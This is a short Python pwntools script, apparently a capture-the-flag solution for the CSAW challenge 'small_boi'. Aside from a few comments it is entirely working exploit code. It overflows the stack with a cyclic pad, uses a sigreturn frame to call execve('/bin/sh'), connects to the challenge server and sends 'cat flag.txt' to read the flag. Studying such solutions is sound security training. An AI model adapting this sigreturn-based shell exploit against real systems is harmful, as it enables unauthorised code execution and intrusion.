#!/usr/bin/env python2

from pwn import *
context.arch = 'amd64'

syscall_pop_rbp = 0x400185
sigreturn = 0x400180

bin_sh = 0x4001ca
null = 0x400007

stack_offset = 0x28
read_length = 0x200

# set up sigreturn frame to call execve("/bin/sh", NULL, NULL)
# rsp <- any valid address
# Then ROP to sigreturn

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = null
frame.rdx = null
frame.rip = syscall_pop_rbp
frame.rsp = syscall_pop_rbp

payload = cyclic(stack_offset) + p64(sigreturn) + bytes(frame)
payload += cyclic((read_length - len(payload)))

# r = process('./small_boi')
r = remote('pwn.chal.csaw.io', 1002)
r.send(payload)
r.sendline('cat flag.txt')
r.shutdown(direction='send')
r.stream()
